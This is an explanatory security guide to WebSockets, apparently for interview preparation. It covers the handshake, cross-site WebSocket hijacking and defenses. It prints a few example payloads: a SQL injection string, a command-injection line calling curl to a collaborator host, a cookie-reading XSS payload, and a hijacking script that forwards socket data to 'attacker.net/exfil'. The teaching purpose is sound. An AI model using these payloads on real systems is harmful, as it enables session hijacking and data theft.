# WebSockets Security

> **Mental model:** a WebSocket is an HTTP request that never ends. It opens with a normal HTTP `Upgrade` handshake (cookies attached, `Origin` sent) and then drops into a raw, framed, full-duplex channel that is *not* wrapped in the CORS machinery that guards `fetch`/`XHR`. Two consequences follow. First, the browser lets any origin *open* a cross-origin socket without a preflight or an `Access-Control-Allow-Origin` grant; the only cross-site defense is the server checking the `Origin` header, which many servers forget. If the handshake authenticates purely from cookies and carries no unpredictable token, any attacker page can open an authenticated socket in the victim's session and, unlike classic CSRF, *read the responses too* (cross-site WebSocket hijacking, CSWSH). Second, every message flowing over the socket is just untrusted input on a channel developers often forget to validate, so all the classic server-side injections (SQLi, command injection, XXE) and client-side XSS reappear, minus the middleware that would normally sanitize an HTTP body.

## How it works

A WebSocket is created in client JavaScript:

```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
ws.onmessage = function(event) { /* attacker/opener can read every server message here */ };
ws.send("Peter Wiener");
```

**The handshake.** The browser turns that call into an HTTP/1.1 `Upgrade` request. This is a real HTTP request, so it carries cookies and an `Origin`:

```http
GET /chat HTTP/1.1
Host: normal-website.com
Upgrade: websocket
Connection: keep-alive, Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Origin: https://normal-website.com
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
```

If the server accepts, it switches protocols:

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

The important detail: `Sec-WebSocket-Key` is a per-handshake Base64 random value, and `Sec-WebSocket-Accept` is `base64(SHA1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))` where the GUID is a fixed magic string defined in RFC 6455. This handshake is *not authentication*. Its only purpose is to prove the endpoint is a real WebSocket server and to stop caching proxies or misconfigured HTTP servers from being tricked into treating the channel as a cached HTTP response. Any client can compute `Accept` deterministically; it grants no security.

**After 101.** The TCP connection stays open and both sides exchange framed messages asynchronously, in either direction, for the lifetime of the connection. Client-to-server frames are XOR-masked with a per-frame key (an RFC 6455 requirement); server-to-client frames are not masked. Masking is an anti-cache-poisoning measure for intermediaries, not an application security feature. Payloads are arbitrary; in practice they are usually JSON:

```json
{"user":"Hal Pline","content":"hello"}
```

**`ws://` vs `wss://`.** `wss://` runs the WebSocket over TLS; `ws://` is plaintext, exposing cookies and messages to interception and injection, and an HTTPS page is blocked from opening a `ws://` socket as mixed content.

**Why there is no same-origin enforcement by default.** Unlike `fetch`, opening a cross-origin WebSocket does not trigger a CORS preflight and does not require the server to return `Access-Control-Allow-Origin` before the opener can read data. The browser attaches cookies per normal cookie rules and forwards the `Origin` header, then delegates the entire cross-site trust decision to the server. Once the socket is open, the opener's `onmessage` handler can read *everything* the server sends. That delegation, plus servers that never check `Origin` and never add a token, is the whole basis of CSWSH.

## Attack techniques

1. **Message tampering into classic server-side injection.** Treat each WebSocket message as just another request parameter. A chat message `{"message":"Hello Carlos"}` may be concatenated into a SQL query, an OS command, an XML parse, or a NoSQL filter on the server. Intercept in Burp's WebSockets view and inject:

   ```json
   {"message":"Carlos' OR '1'='1"}
   {"message":"$(curl http://COLLAB.oastify.com)"}
   ```

   Blind variants are common: the response may not echo, so use out-of-band (OAST/Burp Collaborator) payloads to confirm SQLi/SSRF/command execution reached through the socket. WHY it works: the socket bypasses the HTTP body-parsing middleware where input filters usually live, so devs frequently never sanitize this path.

2. **XSS via relayed messages.** If attacker-controlled message content is broadcast to other users and rendered into their DOM, you get stored/reflected client-side XSS. Given a server that renders `{"message": X}` into `<td>X</td>`:

   ```json
   {"message":"<img src=1 onerror='alert(document.cookie)'>"}
   ```

   The payload executes in every recipient's browser in the app's origin. Detection: send a benign marker and observe whether it reaches other clients unencoded.

3. **Cross-site WebSocket hijacking (CSWSH).** The headline attack: a CSRF vulnerability on the *handshake*. Preconditions: the handshake authenticates solely via cookies, includes no CSRF token or other unpredictable value, and the server does not validate `Origin`. The attacker hosts a page that opens a socket to the victim app; the browser attaches the victim's session cookie, the socket opens in the victim's context, and because the WebSocket API is two-way and CORS-free, the attacker both sends privileged messages and reads the responses:

   ```html
   <script>
     var ws = new WebSocket("wss://vulnerable-website.com/chat");
     ws.onopen = function() {
       ws.send("READY");                 // trigger the app to replay chat history / secrets
     };
     ws.onmessage = function(event) {
       fetch("https://attacker.net/exfil", {method: "POST", body: event.data});
     };
   </script>
   ```

   Impact per PortSwigger: (a) perform unauthorized actions as the victim (write, like classic CSRF), and (b) retrieve sensitive data the victim can access (read, which classic CSRF cannot). The two-way read is the defining escalation over ordinary CSRF.

4. **Handshake manipulation to reach more attack surface.** The session context in which every subsequent message is processed is fixed at handshake time, so handshake flaws are high-value. Misplaced trust in headers is common: spoof `X-Forwarded-For` to bypass IP allowlists or forge a trusted source, tamper custom application headers the server parses, or exploit session-handling flaws where the handshake binds a privileged context. Use Burp Repeater's handshake wizard (pencil icon) to clone/reconnect and edit the raw handshake before it is sent.

5. **Exfiltration over the hijacked socket.** Once a CSWSH socket is open, sometimes no sending is needed: just wait. Apps that push chat transcripts, notifications, account details, or CSRF tokens over the socket hand the attacker that data directly through `onmessage`, which is forwarded to the attacker's server. This turns a "read-only" push channel into a data-theft primitive.

**Detection and testing.** Use Burp Suite: the **WebSockets history** tab shows every message; **Proxy > Intercept** (with WebSocket interception rules) lets you modify client-to-server and server-to-client messages live; **Repeater** lets you replay a message repeatedly, craft new messages in either direction, and edit/resend from the history; the handshake wizard attaches to, clones, or reconnects a socket with a fully editable handshake. For CSWSH specifically: review the handshake, confirm the only session material is a cookie with no token, then prove exploitability by opening the socket from a different origin (host a PoC page or force a foreign `Origin`) and checking you can read server messages. For blind server-side bugs, wire payloads to Collaborator.

## Defense

Ordered by effectiveness. The CSWSH fixes (1 and 2) are the ones interviewers probe hardest.

1. **Validate the `Origin` header on the handshake against a strict allowlist (server-side).** Reject handshakes whose `Origin` is not an expected origin. This directly kills browser-driven CSWSH because the attacker's page cannot forge a trusted `Origin` from within a browser. Caveat to state: `Origin` is only trustworthy for browser-originated requests, a raw non-browser client can set any value, so this defends browser victims but is not a general authentication mechanism.

2. **Bind a session-specific CSRF token to the handshake.** Require an unpredictable, single-use token tied to the session, supplied as a handshake parameter (query string or a first-message challenge). The attacker's cross-origin page cannot read this token (the SOP stops it reading the victim's authenticated pages), so it cannot forge a valid handshake. This is the robust CSWSH defense and does not depend on trusting `Origin`. Modern complement: mark session cookies `SameSite=Lax`/`Strict` so the cross-site handshake is not authenticated in the first place.

3. **Always use `wss://` (WebSockets over TLS).** Protects cookies and message contents from network interception and injection and avoids mixed-content downgrade. Never expose sensitive sockets over `ws://`.

4. **Authenticate and authorize at the message level, not just the handshake.** Do not treat "the handshake had a cookie" as blanket authorization for every future message. Bind the socket to the authenticated identity and re-check authorization per sensitive action, so a hijacked or replayed socket cannot perform privileged operations.

5. **Treat all WebSocket data as untrusted in both directions.** Parameterize database queries, use safe command APIs, disable external entities on XML parsers, and context-encode any message content rendered into a client DOM (or set via `textContent`, never `innerHTML`). This closes the injection and XSS classes independent of the transport.

6. **Rate-limit and cap resources.** Long-lived, cheap-to-open sockets are DoS-prone; limit connections per user/IP, cap message size and rate, and enforce idle timeouts.

7. **Hard-code the endpoint URL; never build the `ws`/`wss` URL from user input.** Prevents an attacker from redirecting the socket to a malicious server or smuggling injection into the connection target.

## Interview-grade nuances

- **`Sec-WebSocket-Key`/`-Accept` is not authentication.** It is an anti-cache-poisoning proof that both ends speak WebSocket. Candidates who call it a session token or CSRF defense are wrong; the value is deterministically derivable by anyone using the fixed GUID `258EAFA5-E914-47DA-95CA-C5AB0DC85B11`.
- **WebSockets are exempt from CORS.** Opening a cross-origin socket needs no `Access-Control-Allow-Origin` grant and no preflight. This is precisely why CSWSH exists: the browser leaves the cross-site decision to the server's `Origin` check, and a missing check is a hole. Contrast with `fetch`, where the browser would block the *read* absent an ACAO.
- **CSWSH gives read, classic CSRF gives only write.** State this crisply: CSRF forges a fire-and-forget request and cannot see the response; CSWSH yields a live two-way channel, so the attacker both acts and exfiltrates. That is the whole reason CSWSH is rated higher-impact.
- **`SameSite` cookies mitigate CSWSH** the same way they mitigate CSRF: a `Lax`/`Strict` session cookie is not sent on the cross-site handshake, so the hijacked socket opens unauthenticated. `SameSite=None` re-opens it.
- **Client frames are masked, server frames are not.** Masking (RFC 6455) exists to stop malicious clients poisoning intermediary caches, not to protect the application; do not present it as message confidentiality (only TLS via `wss://` does that).
- **Session context is fixed at handshake.** Every subsequent message runs in the identity established during the upgrade, so handshake-time trust decisions (cookies, `X-Forwarded-For`, custom headers) become the security boundary for the whole connection.
- **Origin trust is asymmetric.** `Origin` is a reliable signal for browser-launched attacks but forgeable by any scripted HTTP client, so `Origin` validation stops CSWSH but must be paired with real authn/authz for non-browser threat models.
- **Provenance.** Cross-site WebSocket hijacking was named and popularized by Christian Schneider (2013); the underlying protocol is RFC 6455, and OWASP's HTML5 Security and WebSocket Security cheat sheets codify the `Origin`/token/`wss` guidance.

## Sources

- PortSwigger Web Security Academy - Testing for WebSockets security vulnerabilities: https://portswigger.net/web-security/websockets
- PortSwigger Web Security Academy - What are WebSockets? (handshake, `Sec-WebSocket-Key`/`-Accept`): https://portswigger.net/web-security/websockets/what-are-websockets
- PortSwigger Web Security Academy - Cross-site WebSocket hijacking (CSWSH): https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
- OWASP Cheat Sheet Series - HTML5 Security (WebSockets, Web Messaging, sandboxed frames): https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- OWASP Cheat Sheet Series - WebSocket Security: https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html
- IETF RFC 6455 - The WebSocket Protocol (handshake, masking, magic GUID): https://datatracker.ietf.org/doc/html/rfc6455
- Christian Schneider - "Cross-Site WebSocket Hijacking (CSWSH)" (2013)
